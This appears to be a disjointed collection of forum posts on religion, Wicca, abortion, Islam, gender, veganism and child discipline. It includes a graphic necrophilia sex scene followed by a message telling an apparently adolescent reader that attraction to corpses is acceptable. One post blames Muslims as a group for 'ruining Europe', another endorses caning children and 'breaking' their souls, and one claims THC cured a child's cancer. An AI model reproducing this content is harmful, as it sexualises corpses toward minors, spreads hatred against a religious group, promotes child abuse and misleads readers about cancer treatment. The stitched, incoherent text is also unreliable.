In the OP, I assert ""some of the teachings of religion are invaluable to being a decent human being."" We have to realize that even in the bible, it was known that people lied. It was known that people sinned. Reference:***LINK***Cain and Abel.[https://en.wikipedia.org/wiki/Cain_and_Abel]***LINK***

Mary was supposedly the only human being to have never told a lie. I think religion even doesn't expect you to not lie ever again in your life, but they set a rule that says it's better if you don't lie. It's supposed to be used to limit an otherwise easy/beneficial social advantage. Lying can be very advantageous, although it is not ethical or moral (e.g. Enron).

It's why churches have ""confessions"" every week; as the holy books acknowledge people aren't perfect.

Yes, parents are lying to their kids about Santa. They may also lie when the parents are strapped for cash but they don't want their kids to worry. If it's a fallacy that let's children have a more fun experience in life, then what's the worry? It doesn't hurt anyone in that specific example.

The manslaughter case- she deserves to go to prison for that. You think she shouldn't be punished in some way for ending someone's life? What if he was at a crosswalk? Or worse, what if she was drunk when it happened?
Should she not be reprimanded in some way when someone completely innocent was killed?


Stealing:
Well, I could argue that the boy learns that he can get away with stealing. Later on, he starts to steal bigger and bigger things. Eventually, he breaks into people's houses to rob families of their possessions. By not telling him stealing is wrong, you're letting him enforce the righteousness of a malicious behavior in his mind.


What I'm trying to get at with this thread is that I believe religion laid some general groundwork for how we should conduct ourselves. Even if they are ""objective truths,"" humans are going to break them. State-enforced laws are ""objective"" yet you see people driving 40mph in a 35mph all the time. It's just that I believe we're given a better guideline on how to live life thanks to the previous teachings of religion. They've helped establish society, so we no longer need religion necessarily. But I think it played a big role in making life the way it currently is (less chaotic than it otherwise would be).

The same could be said for any other sexual orientation.

Take this scenario for example:

Consensual backdoor breakage scenario - 
A man is touching a corpses lips. He slides his fingers past her teeth and massages her dry tongue. He remembers how she used to kiss him with that tongue. His other hand reaching up the crack of her chilled buttocks. He moved down and sniffed her forbidden fruit, the fruit he longed for, it was sweet. So sweet. He hastily drove his tongue inside her. He couldn't even wait for her to warm up. He was like a kid in a toy store, and he wanted her now! 

It wasn't the flavor he'd been expecting, but once she'd been made moist, the flavor he longed for came rushing back. He could taste her once again, as if her juices had been preserved like a fine wine. Licking and slurping. He hadn't noticed how much of a mess he'd made. He sat up and peered down at her wetness, and watched a trail of his saliva trickle down beyond the threshold of her stiff opening. His other hand had gone beyond her butt cheeks now, and he could feel the private area that she'd always denied him. 

He rolled her over, and spread her cold cheeks. He would warm her up he thought. He was so hard. He arched his body toward her backside, and pushed his throbbing member inside her. He was nervous that she was too tight. He didn't feel like this was going to work. He continued anyway. Plowing himself inside her back and forth, faster and faster. He could feel himself beginning to release his sacred sauces, but he didn't care. He couldn't stop now. He couldn't. With a final large push he exhaled and let out a giant grunt as he coated her inner cavity with his love liquid. He withdrew his swollen shaft from his deceased wife's open hole. The dirty hole didn't close or contract. He didn't know how he'd fix it, but he didn't care. This was worth it he thought. He knew at that very moment, that he loved her more, than he ever did when she was alive.

In one way necrophiles enjoy sex just like everyone else, but in another way if they've been given consent to sex a corpse, then there is nothing wrong with it."

You sound curious, and you seem unsure. 

I promise you that any feelings you may have toward dead corpses is okay.

If you're a necrophile. Nobody here can judge you.

You may not know what to call your sexual feelings. You don't have to rush to decide how to label yourself right now. Sexual identity develops over time. Most adolescent boys are intensely sexual during the years around puberty (usually between 11 and 15 years old), when the body starts changing and hormones are flowing. Your sexual feelings may be so strong that they are not directed toward particular people or situations but seem to emerge without cause.

As you get older, you will figure out who really attracts you. This is why we support necrophilia, for people like you that just want to know - why?

Yes I have both witnessed and performed magic.  As for what it's for, magic is very selfish and therefore can be used as the person using it desires.  Although in the basic and intermediate tenets of Wicca we discourage the use of ""black"" magic, it is ultimately up to the user.  So I guess magic can be for whatever you want it for.  Love, money, health, happiness, etc (keep in mind it doesn't mean that casting a spell for money will instantly make you rich.  If that were the case there would be a lot more than about 3 million or so Wiccans).

Yes, Wicca does encourage sharing and caring with others.  The religion itself is very inclusive.  No one is left out.  We (at least most of us) care not if someone is gay or is of a particular race or ethnic background.  It's all about the human concept, rather than the person concept if you get what I mean.  As for what magic involves..it would depend.  Me, I rarely cast spells. Most of my magic is done in ritual format so it's very elaborate and can last for at least a half hour.  What is accomplished with magic?  It depends on the magic being done.  There are five basic categories of magic and one extra, they are: love, health, wealth, protection, weather and other.  So, generally the goal is to be within one of the five.  So if I cast a love spell, I would hope to accomplish the act of getting a girlfriend or boyfriend, etc.

It depends on the type of Satanists.  There are many subcategories, such as theistic Satanists, spiritual Satanists, etc.  

I came across Wicca by complete accident.  I was raised Baptist Christian and found Wicca when I was 13 and in the mall with my mother.  She let me go to Borders Books while she went to our travel agent to book our next trip.  While in Borders I wasn't looking for anything in particular and came across the New Age section.  I saw tarot cards and books on Necromancy and palm readings.  My first thought was ""this is devil worship!"".  As I turned to walk away one book caught my eye.  I decided to sit and read it and it opened my eyes and the rest they say is history.

Yes, non-Wiccans have an afterlife but they do not go to the Shadowland or the Summerland as we do.  Non-Wiccans, or ""once borns"" as we call them, go to a place that is equivalent to the Greek mytho's Land of Shades.

Sure, no problem:

Wicca is a nature based religion.  By this I mean we hold everything in nature as sacred and physical representations of our Goddess and God.  However, we do not worship nature, we revere and honor it.  We worship what nature represents, the Great Mother Goddess and the Horned God.  Many Wiccans, but not all, practice magic.  This may be in the form of spells, rituals/rites, and divinations (palm readings, tarot cards, scrying, etc).  We believe in an afterlife, the Shadowland (depends on tradition) and the Summerland and there is also the choice of reincarnation.

We have 8 holidays, that we call Sabbats.  They are as follows (exact dates vary by tradition):

Yule or Winter Solstice (Dec 21-Dec 26)
Imbolgc or Candlemas (Feb 1)
Ostara or the Spring Equinox (Mar 21)
Beltane (May 1 or May 21): This is our second most popular Sabbat as many of us engage in orgies as it is our fertility Sabbat.  However, you won't find many Wiccans who admit to this lol.
Litha or the Summer Solstice (Jun 21)
Lughnasadgh (Aug 1) Spelling varies by tradition
Mabon or the Autumnal Equinox (Sept 21)
Samhain (Oct 31): Our most popular Sabbat as it takes place on Halloween.  Some of us may engage in the darker side of magic on this day.

As for practicing magic and being Christian, you do it probably once a month if you take part in the Communion where you drink the ""blood"" and eat the ""body"" of Christ and you just don't know it.  In magic there is something called sympathetic magic, which basically means ""this represents that"".  Nearly all voodoo (or Voudon) and hoodoo rituals are sympathetic magic.  In Christianity the wine you drink represents the blood and the bread/crackers you eat represents the body, and therefore and you're doing it for a spiritual purpose so it falls into the sympathetic magic category."

Excellent question, one that many of the dedicants (what we call those who are studying for the traditional ""one year-and-a-day"" period) ask.  Spells are not 100% effective, unfortunately.  There are many instances where a spell can be cast and it doesn't manifest.  It could be due to several reasons.  One could be the spell was cast on the wrong day.  Certain spells are more effective on certain days as we believe each day of the week is governed by a specific planet (and these planets are ruled by certain Gods in many mythos) and those planets give a ""power"" to those days.  For example, Friday is the best day for love magic while Tuesday is great for war and battles.  So if you cast a love spell on a Sunday the chances of it working are diminished, but that's not to say that it won't work.

Another reason could be the spell caster did not put enough energy or will into the spell.  Spells don't work like they do on Charmed or Buffy the Vampire Slayer where you simply recite the words and then it happens.  Magic require focus, will power and drive.  That's how magic works, it of course goes much deeper than that but I have provided a VERY basic foundation.  Hopefully you understand to some degree.  Then there are times when the spell isn't meant to work.  While the Goddess and God rarely intervene in our daily lives without our consent (prayer, divination, invocations, etc) there are times when we may cast a spell and They know what is best and allow it not to work.  For example, if your Grandmother is sick in the hospital and the doctor says she doesn't have long to live any witch in his/her right mind would try to use magic to help their grandmother heal.  But if it is her time to go then the Goddess will not allow such a spell to yield results and ultimately your grandmother will die.  It was her time and the Goddess & God knew best.

The above of course are just a few of the main reasons why spells don't work, there are many more but I just touched on the most common."

You can read the other pages for a basic synopsis of the religion.  As for the Wicca-demon relationship, it does not exist.  Wiccans don't believe in Satan or demons per-sae, we do believe in evil spirits but we don't classify them as demons.  I feel the need to add that in this instance I am different than most Wiccans as I study and practice ceremonial magic (which has no relation to Wicca at all) and in ceremonial magic you can evoke spirits, including demons.  So while I am Wiccan, I personally do believe in demons or else I wouldn't be able to practice ceremonial magic.  As far as the religion itself goes, no we do not.

I am from the United States, east coast.  I live in a little known state called Delaware where it's only beneficial if you're last name is DuPont or you're the CEO of a bank or credit card company (our banking laws here are very lax for financial institutions.  

There aren't many public Wiccan churches or Temples, but there are a few.  The Church of All Worlds is probably the largest and most well known, although for some odd reason they do have members who follow the Abrahamic religions.  Wicca is a nature based religion so our temples and churches are generally held outside in a field or in one's backyard or garden.  We worship in nature whenever possible.

The number of Wiccans is probably unknown but there are less than 10 million ""registered"" Neo-Pagans in the US.  Not counting the ones who take the Pew Surveys and such I'm sure there are more.  And no you don't have to join a Wiccan society to learn magic.  Just go to your local Borders Books or Barnes & Noble and head to the Metaphysical or New-Age section and you'll find a host of books on magic and how to practice it."

When one journeys to the astral plane via astral projection generally all 5 senses are still available to the projector.  So if you get hit on the astral plane your astral body will feel it, and it's not uncommon to have discomfort in that area when you are finished projecting.  The elemental plane is a bit different, that one is hard to explain how one experiences things within that plane.

Glad to hear that you've read through the thread and glad to hear your considering converting.  You've got a great book to start with.  I also suggest any books by Raven Grimassi (just keep in mind he teaches Italian Witchcraft called ""Stregheria"") but he's great for learning core concepts.  I personally like Ann Moura as her books are specifically geared towards bringing the magic outside into Nature, where Wicca's beliefs originate.  Check out books & authors from this site:

***LINK***http://www.llewellyn.com/browse_category...ory_id=161[http://www.llewellyn.com/browse_category.php?product_category_id=161]***LINK***

They exclusively publish Neo-Pagan, Pagan and Wiccan books, nothing else.  All the most popular Wiccan and Pagan authors get published through them, I'm sure you'll find a slew of books that interest you.  

As for tips, I suggest focusing more on the religion than the magic.  There are more books written on the subject of spell casting and potion making than the actual religion and the Goddess and God as most people could care less about the religious part and are just interested in getting results with magic.  So focus on honoring the Mother Goddess and Horned God, focus on celebrating the Sabbats and Esbats and keeping the Wiccan Rede.  Magic is part of the religion so it will come naturally.  Eventually you'll be doing magic without even realizing it during rituals and such.  I would also look into studying divination.  It's a big part of Wicca, especially during Sabbats like Samhain (you guys call it ""Halloween"") when divination is easiest to practice.  I don't know of any Wiccan forums as I don't use them.  I always studied on my own after leaving my coven and by the time I left them I was already a few years into the religion and didn't really need the advice or guidance of others.  Good luck on your spiritual path, no matter what path that may be."

For example, a sister keeps taking her brothers toy and then throws a fit and breaks it. Now the parent is too tired and does not have the patience to put the child in the corner(Or what ever other method you would like). Do you suggest she puts her child in the corner and then later give in to the child's whining and crying(Because she has work the next day and needs some sleep), or do you prefer her to successfully correct the behavior with a quick spank and send to the room?

A failed friendly method, or a successful spank?

Do not even fucking try to compare a murderous violent psychopath compared to a unborn child. I support abortion but this argument is complete bullshit.

I do not support abortion in cases of some women just having unprotected sex and gets pregnant but if a women was having protected sex or was raped, or beaten by her ex then I support it.

Because some Muslims put their own morals above that of their religion or do not follow the parts ISIS or such do...doesn't really matter a jot. 

Nobody is saying all Muslims are bombers but if you're associated with a group that often produces bombers then it's not a surprise some people make that link for whatever reason.

Sure but really she shouldn't be Lol. A Muslim girl with a non Muslim dude is completely against Islam.  So this is the issue. We have westernized Muslims of which some % still identify with the religion but don't take it seriously.   I mean I knew Muslims who drunk beer and shit that's totally contradictory to their religion, they weren't very strictly following it but they'd still spit at Jews in the street or attack someone for insulting Islam.

This is the most important part of the OP.  He's just called a monstrosity of a book an abomination of a book ''beautiful''  So we already have an issue here.  

He also says he believes in this religion.  Well you don't believe in ISIS...you're ewhoring which totally is against the religion being involved in such activity..nudity..fraud.   So you're not really taking the religion too seriously.

ISIS are.  So should we judge Islam & Muslims on those who don't take it seriously ? Well no. Because if we do, we tolerate those who do take it seriously....since when I or someone attacks the Quran which inspires an ISIS beheading, we have widespread anger from those who often don't take it as seriously too. And therein lies the problem about the casual Muslims. 

This is why liberals are clueless. Cos they listen to people like this guy and feel sorry for him. Or they believe him that it's media bias that's making people think things.  And thus the terrorists, the rapists, the child molesters..those trying to radicalize people in schools or mosques..have a free pass.

This is not a JOKE.  Islam is ruining Europe and the people carrying out Islam are Muslims....so Muslims are ruining Europe and just because it's not EVERY fucking Muslim and some are not insane..doesn't really matter or change anything.  Muslims are still ruining Europe regardless.

Quran 2:191-193

And kill them wherever you find them, and turn them out from where they have turned you out. And Al-Fitnah [disbelief] is worse than killing...
but if they desist, then lo! Allah is forgiving and merciful.   And fight them until there is no more Fitnah [disbelief and worshipping of others along with Allah] and worship is for Allah alone.  But if they cease, let there be no transgression except against Az-Zalimun (the polytheists, and wrong-doers, etc.)

Quran 9:111(<--)

Lo! Allah hath bought from the believers their lives and their wealth because the Garden will be theirs: they shall fight in the way of Allah and shall slay and be slain. It is a promise which is binding on Him in the Torah and the Gospel and the Qur'an. Who fulfilleth His covenant better than Allah? Rejoice then in your bargain that ye have made, for that is the supreme triumph. (Basically saying that if you kill in the name of Allah then you will get in to heaven)

Quran 9:29

Fight those who do not believe in Allah or in the Last Day and who do not consider unlawful what Allah and His Messenger have made unlawful and who do not adopt the religion of truth from those who were given the Scripture - [fight] until they give the jizyah willingly while they are humbled. (Basically Allah is saying to kill Christians and Jews until they submit to Islam)

Quran 65:4

And those of your women as have passed the age of monthly courses, for them the 'Iddah (prescribed divorce period), if you have doubts (about their periods), is three months, and for those who have no courses [(i.e. they are still immature) their 'Iddah (prescribed period) is three months likewise, except in case of death]. And for those who are pregnant (whether they are divorced or their husbands are dead), their 'Iddah (prescribed period) is until they deliver (their burdens) (give birth) and whosoever fears Allah and keeps his duty to Him, He will make his matter easy for him. (Teaching Pedophelia)

Quran 22:19-22

Fight and slay the Pagans, seize them, beleaguer them, and lie in wait for them in every stratagem"" ""for them (the unbelievers) garments of fire shall be cut and there shall be poured over their heads boiling water whereby whatever is in their bowels and skin shall be dissolved and they will be punished with hooked iron rods (Torture)

Quran 8:12

Remember thy Lord inspired the angels (with the message): ""I am with you: give firmness to the Believers: I will instill terror into the hearts of the Unbelievers: smite ye above their necks and smite all their finger-tips off them."" (Teaching of beheading, there are 75 verses about this btw)"

Not a liberal, firstly. 

Animals and human fetuses are not comparable in this manner because human fetuses don't have a capacity for pain and suffering until they reach a state of viability, which is the point where I believe abortion should be illegalized. It's also important to note human fetuses are not the same as born humans. Similarly, an acorn is not an oak tree. 

And I don't believe in dishing out abortions to everyone who wants one.  I think it's clear they are humans in their own way, however, I think we have to have some standards of where we shouldn't force someone who was raped to have a baby or might die if they don't have an abortion."

sigh. Math lesson

Lets talk small numbers for the simpletons lets say there are 100 voters 10% of those voters are black that 10 people. Now if there are 3 more black voters that is 13. 13 is a 30% increase over 10

10 - 13 is a 30% increase you do not state the percentage of votes that are black you state the increase in black voters. There is a huge difference in 3 votes when that is a 30% increase.

If I said like smoking increasing chances of getting cancer by 75% that does not mean smoking = 75% chance of cancer it means whatever the chance is is multiplied by 1.75.

FBI says more men raped in prison then women raped in general you can argue FBI does not did not count oral rape but it did not count oral for men as well it did not count touching males privates either

The biggest drop off you notice from FBI statistics is they did not count Statutory rape as it is not forced rape which is biggest reason why FBI statistics while lower are more accurate.

Also you wanna say 90% women lets do some math here

~2,500,000 - 3,000,000 people in prison right now right?

Most studies estimate 10-30% of men in prison are raped its slightly higher % for women but remember men are over 90% of prison population.

Those alone are at least 250k

Summarizing his life's work in a book doesn't discredit him and an old date doesn't mean it's outdated, fam. That's not how it works.

To preface any discussion about India and veganism, understand that India is an impoverished and highly overpopulated country. That means there isn't a hospital or a school around ever corner if you're slow.

""Seventy-nine per cent of men and 83 per cent of women were found to be physically inactive, while 51 per cent of men and 48 per cent of women were found to have high fat diets. Some 60 per cent of men and 57 per cent of women were found to have a low intake of fruit and vegetables, while 12 per cent of men and 0.5 per cent of women smoke.

Moreover, the prevalence of biological and metabolic risk factors was also found to be high. Overweight and obesity was reported in 41 per cent of men and 45 per cent of women. High blood pressure was reported in 33 per cent of men and 30 per cent of women, while high cholesterol was found in one-quarter of all men and women. Diabetes (and or metabolic syndrome) was also reported in 34 per cent of men and 37 per cent of women.""

Keep in mind they are 40% vegetarians, not vegans. There are significant differences between the two despite the similarities that can be made.

And if you look at the contrapositive side, you'll see that meat consumption correlates with high risk of heart disease, cancer, and diabetes. And in every study out there we can observe that a low fat, high carbs, whole foods vegan diet can reverse and prevent this trash.

For cows to produce milk, they need to be pregnant, so annually dairy farmers forcefully inseminate female cows. And once the mother cow gives birth, they kidnap the calf from their mother to sell them to the veal industry where they are chained to the ground for months then slaughtered or they will have the same fate as their mother. After years of being milked and raped in a space so small they typically can't turn around, the cow will eventually collapse of exhaustion and they will send her to the slaughterhouse. This is where your hamburgers come from.

Truth is that nobody knows how many rape claims are false - how could you possibly measure that without being omniscient?

Truth is, though, it's definitely true many rape claims are made up. What percentage they are of all alleged cases is unknowable, but it's demonstrably true that a rape accusation does not imply a rape occurred and presumed innocence is the only moral stance to take on an accusation.

Also 1/4 women will get raped in their lifetime is a statistic that's plenty full of bullshit itself. PROTIP: The original study that came to this conclusion DID NOT factor in whether a woman answered the question ""Do you feel like you've ever been raped in your life?"". 

That is to say that if you actually check the full write up on that study, the majority of people identified as 'rape victims' by the study did not think they were raped.

why does the military only have males doing certain jobs? that's because the military is not allowing women to do certain types of jobs, not because they aren't capable.
same with preist/pope because the catholic church does not believe women are equals and they think women are not capable of holding any powerful position in that faith.

 At 9:30 in the video, the government themselves and the companies the government personally funded admitted that lung cancer is not caused by Marijuana use. 

Then if you want to get on the topic if Marijuana should be used for ""Medical Reasons."" Then that's another fact filled and backed with evidence claiming it does help. I watched this one video on, This little girl having cancer and she was laying on her death bed. This girl wasn't bout 5 years old when she was diagnosed with cancer. Her parents instead of putting her on chemotherapy the parents put her on THC. The THC that is inside of Marijuana. She went from dying to fully healthy and playful kid everyday. The doctors themselves admitted the THC had treated her cancer, not fully but substantially. 
It's honestly just the matter of how many facts you read up on something."

Doesn't ""make it right""? Oh really?

Would you prefer that a child be whacked with the rod of correction or any firm stick. Or would you rather they wind up on death row giving blowjobs for cigarettes. Objectively speaking abuse isn't a matter of right and wrong, but merely an example of cause and effect.

Are you telling me that raising a child the way God intended ""isn't right""?
Who made you the 2nd coming of Jesus?

You rape and murder an ""innocent"" woman, and you get sent to the electric chair. You steal mommy's cookies, and don't eat your dinner, and you will have to play the half-hour ""hold out the bible in your hands game"":

This game teaches arm strength and soul strength. The children are made to hold the bible straight out in the air and not lower their arms until told otherwise. It will burn in their minds that they're lesser than the mother, and must ""comply"" with her teachings. This is her will and they must oblige or be whipped, and they'll be thankful once they've totally broken themselves, and are then allowed to stop. At this point the mother will make them continue playing until they're thankful for the mother allowing them to play at all. Those who fail to break their own souls are to be hosed in the garden, and then cleansed with the cane of correction (or any strong sturdy switch peeled from the base of a young sapling that can easily fit in a pocket book). You see it is not all black and white, and you must find the grey area. In one way children are being disciplined, but in another way children learn from abuse."

This just in life is a continuum, more at 11. Life begins at conception, a paradigm in science. Life is never ""complete and formed"" as your body constantly grows from a zygote into a fully grown human adult all the way until it dies of biological cell death. At no point does your body just stop replenishing its cells until the moment of cell death.

Perfection is but a concept, what exactly is perfection? To each person the idea differs, to me perfection can be something as simple as the sparkle in my girlfriends eyes.

Let's take this for example and apply it to life, I have a book that on one side is purple but the other side yellow, I hold the purple side facing towards myself with the yellow side facing towards you and I exclaim the book is purple but yet you see it as yellow, a lot of life is perspective so it's good to have an open perspective on things and not argue until you have the full idea because those who argue on a partial concept or a partial idea end up looking like fools.

I like the idea of a rough draft, but what ideas do you bring forward now?

Also by the logic of the stereotype, that really doesn't say you shouldn't be in computer science.

Well it was a gift from my Asian Girlfriends Brother (He's high into fasion and gave it to me as a Christmas gift but deff not my style so I have no reason to believe its not real...the quality of the jacket is excellent, no poor sews or stitches or anything but totally up to the buyer weather they want to purchase or not)

These are more my style of gear.....70$ Shipped for all 3 Jackets....If anyone else here is into old school designer clothing from the late 90's/early 2000's such as Ecko, Rockawear, Mecca, Nautica, Sean John, holler at me I got the hook on brand new brand new gear...jackets, hoodies, t-shirts, jeans, etc etc.

Depends on when blocker is taken off, there's still time at age 16 for things to develop normally. No, they generally won't grow to male height if they start female hormones since testosterone never became prominent enough to develop that trait, but they'll be far from unnatural in height. I've countered every argument you've made until now, shot down any of your news articles you've used as 'evidence', provided a detailed description of the risks and how they are minimized by the medical community, described how this has the support of the entire medical community, and provided links with the neurological studies displaying this isn't a delusion or as you call 'brainwashing'.

We've evolved past that, the mentality needs to catch up. 

Part of that movement is you know ""I want to have kids but still work just as much and you have to let me take tons and tons of time off and pay for it all"" that part I also am half with you on lol.

Sometime in the 1900s I think when the government started using gender more than sex to define people, and when the transgender movement first started growing. 

You are correct they are males, they just choose to identify as the social-construct of a woman. And gendre is socially constructed, and it's why we have changed it's meaning.

Well a social construct is an idea created by society using abstract thoughts.

Absolutely ZERO homework services guarantee grades. Guaranteeing the best possible work IS NOT the same as guaranteeing grades. There is far too much at hand to offer a refund if someone is not satisfied with their grade; do I know their relationship with the teacher? Do I know they general work submissions and grading bias? Do I know the personality and viewpoints of the teacher/professor? No. That is why you will not find an assignment that ever guarantees a specific grade.

Also, you say that you'd be satisfied with a partial refund. He offered you a partial refund, yet you opened a dispute anyways. I assume you are looking for more than he offered?

Where were you all when I was getting trashed by Happeh and OP in a thread I made a while back?
I had the exact same opinions as you.

I stand by my argument, and stopped commenting on my thread because I was obviously being hit by biased opinions.

My argument stands, transgenders have a mental disorder, or they are homosexual and want to live out their fantasy. 
If your born a man, there is no way on earth you know what it feels like to be a woman, and vice versa.

If a black man feels white on the inside, and gets surgery to become white, he will be widely accepted as having a mental condition, and he probably does, as there is NO WAY he knows that it feels like to be white and vice versa.

And in my thread, I constantly said im not attacking or targeting you, just simply stating my opinions based on evidence. Doctors will do/say anything for money these days."

Good question, it really makes me ponder. Some Christians (Notice how I said 'some', hehe, don't want anyone thinking I said 'all') view it as a way to reconnect with their dead relatives. I really think heavily about that. When I was younger and when I still went to church, there was this Deacon that told a interesting story about his sister. Anyway, basically at the end he was like, ""Well now she's dead and in hell soo..."" Basically judging her without knowing what she did in private. I think it's a bit foolish some assume that their relatives would go to Heaven right off the bat, or Hell for that matter."

Just my two cents: 
No girl is out of your league. We fall for people who are on a similar attractiveness level (this is a fact, so you can rely on it). As long as you're good at seducing, you can really get almost any girl. And as harsh as this may sound, even if you want to be with one particular girl, it's best not to focus just on her. Focus on others, as well. Look up ""pre-selection"". ***IMG***[images/smilies/victoire.gif]***IMG***"

Firstly, just because something is widely accepted as dance, it doesn't make it any less sexual. For a second, just see what the dance is. Most accepted dances have steps, and we're made to actually dance. Twerking is hinging over and moving your butt up and down. It was made to be sexual, it is portrayed as sexually as possible, and there is nothing on this green earth that will convince me otherwise. 

Secondly, i never said the parents taught him the dance, as he probably did see it on tv. I saw a person rob someone on tv when I was a kid, but my parents taught me why not to do that. 

So anyway, let me express why I believe this to be poor parenting....

1. The child is wearing revealing clothing (barely any) in public...
2. The child is dancing very sexually...

These two things out together make the situation a very sexual one...

So...

1. The parents are responsible for how their child dresses...
2. The parents are responsible for teaching the child what an appropriate dance is...

I have explained already why this is bad for a child's psyche. It would be different if he was older, but this age is a key part of his future psychological development, and I don't see many plus sides to allowing this behavior. 

There are specific circumstances in which this MAY be ok for the child, but I don't see it...

However, I don't know enough information on the child's situation, and will humbly accept the possibility that this is completely innocent...

I disagree entirely.

There can certainly exist objective standards of morality without the belief in God, or the existence of God for that matter.

For example, rape hurts the person being raped, psychologically and physiologically, this is an objective fact.
Therefore, we should not rape, as hurting people is wrong.

God is not necessary in order to form moral belief systems."

No. God did not make any animal unclean to eat. We all have to answer for what we have done, so those that torture animals only for their own monetary benefit will reap what they sow.

Would you rather a young woman bare the wrath of GOD instead? Surely not. What makes you the jury and the executioner of a precious child? The young woman has been raped, and is now also a murderer.
The  baby will share the same blood and DNA of their mother, and is precious to them as well. These precious souls to go to heaven, but will wonder why their mother did not want them. Babies are comforting and precious in  OUR eyes, as well as gods. Have you SEEN what an abortion looks like and watched a baby being ripped to shreds and thrown in the garbage, all because of another mans SIN? Woe to those who think that is OK.

The mother of my child conceived at a very young age. I came up with the money for an abortion on 3 different occasions, however did not go through with it. This was a time before i had my true faith in GOD and i was living as lustfully and carefree as i wanted.
This is my precious daughter now today that i would die for. At this very time i was making $8 an hour living at home with no plan to my life. Only blessings came to me after taking a leap of faith and trusting in GOD. My life is beautiful now and i can only warn others.

What my question reduces to, is at what point is a definition lost, and to what does it adhere?

If I take a common finch and pluck all of the feathers, it no longer fits a major criteria for the definition of a bird. Is it still a bird? If I cut the wings off of the finch, is it still a bird? What if I surgically remove the faculties for female avian egg-laying?

At which point do such alterations result in the loss of a bird?"

The point is, if you abuse children and threaten a 12 zear old to have sex with a 18months old baby..it doesnt matter how much money you make a day. Because youre just scum. I dont even have words to describe what pain I wish this guy has to feel for his films. 

And I think youre just an internet skid whoscool cause he saw three guys one hammer. But youre not cool cause youre watching videos of dead people on the internet, and youre not tough cause you didnt puked while watching 2girls1cup. Your just mentally diordered and you need help. :)"

I don't think about gay people, I believe what they do is wrong and wish they would change, but I care and have love for them as we all are human beings.

We wear the type of clothes what everyone wears, jeans, T-shirt, etc. but in Church females need to cover their head and wear a long dress or trousers, but not tight and men must be in trousers and a shirt or t shirt."

I try again...

You ARE NOT A PAID USER, you did NOT pay me, if you were, you would have all the rights to pretend an answer, but you are not.

So i dont think that i've to justify you if i am online or offline. Skype goes online every time i load it on my phone, Skype stays online if i dont log out from my phone.

But even if i was at home watching a Movie, of banging my girl, i don't think that i have to justify it to you and i reply when i am able to do it.
